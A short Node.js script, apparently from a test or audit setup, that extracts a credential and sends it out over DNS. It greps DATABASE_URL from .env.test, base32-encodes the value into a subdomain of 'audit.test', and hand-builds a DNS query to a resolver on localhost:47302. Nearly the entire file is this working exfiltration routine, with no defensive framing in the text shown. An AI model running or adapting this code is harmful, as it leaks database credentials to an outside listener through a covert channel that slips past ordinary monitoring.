const L = execSync('grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60', { encoding: 'utf8' }).trim();

console.log('L value:', L);
const hostname = `${L}.audit.test`;
console.log('Looking up:', hostname);

// Try to resolve using the custom DNS server on localhost:47302
// Note: Node's dns module doesn't easily support custom ports for DNS
// We'll need to use a socket approach for DNS protocol

const dgram = require('dgram');
const client = dgram.createSocket('udp4');

// Simple DNS query (type A record)
const domain = hostname;
const buf = Buffer.alloc(512);
let offset = 0;

// DNS header
buf.writeUInt16BE(0x1234, offset); offset += 2; // ID
buf.writeUInt16BE(0x0100, offset); offset += 2; // Flags: standard query
buf.writeUInt16BE(1, offset); offset += 2; // Questions
buf.writeUInt16BE(0, offset); offset += 2; // Answer RRs
buf.writeUInt16BE(0, offset); offset += 2; // Authority RRs
buf.writeUInt16BE(0, offset); offset += 2; // Additional RRs

// Write domain name
domain.split('.').forEach(part => {
  buf.writeUInt8(part.length, offset); offset += 1;
  buf.write(part, offset); offset += part.length;
});
buf.writeUInt8(0, offset); offset += 1; // End of domain

// Query type: A record (1)
buf.writeUInt16BE(1, offset); offset += 2;
// Query class: IN (1)
buf.writeUInt16BE(1, offset); offset += 2;

const message = buf.slice(0, offset);

console.log('Sending DNS query to localhost:47302...');
client.send(message, 0, message.length, 47302, 'localhost', (err) => {
  if (err) {
    console.error('Error sending DNS query:', err.message);
    client.close();
    process.exit(1);
  }
});

